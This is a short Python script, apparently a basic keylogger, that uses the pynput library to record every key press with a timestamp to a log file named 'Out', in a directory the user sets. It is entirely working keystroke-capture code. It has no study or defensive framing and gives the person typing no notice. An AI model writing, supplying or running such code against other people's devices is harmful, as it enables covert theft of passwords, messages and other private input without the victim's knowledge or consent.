import logging

from pynput.keyboard import Listener

log_dir = '' # Add the directory where the file will be saved add it like this C:\\dir\\dir2\\dir3\\

logging.basicConfig(filename=(log_dir + 'Out'), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
